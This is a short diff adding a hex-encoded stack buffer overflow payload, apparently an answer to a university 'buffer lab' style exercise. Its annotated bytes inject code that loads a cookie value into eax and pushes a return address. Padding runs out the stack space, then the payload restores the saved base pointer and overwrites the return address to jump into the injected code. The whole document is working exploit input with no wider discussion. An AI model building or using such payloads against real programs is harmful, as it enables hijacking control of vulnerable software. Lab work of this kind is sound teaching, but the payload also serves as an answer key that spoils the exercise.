@@ -1,0 +1,9 @@
+b8 e9 00 c3 42 /* mov $cookie, %eax */
+68 78 8e 04 08 /* push $retaddr */
+c3 /* ret */
+31 32 33 34 35 /* padding */
+31 32 33 34 35 36 37 38
+31 32 33 34 35 36 37 38
+31 32 33 34 35 36 37 38 /* run out the stack space */
+f0 32 68 55 /* old edb value */
+98 32 68 55 /* exploit code entry, the value of eax */
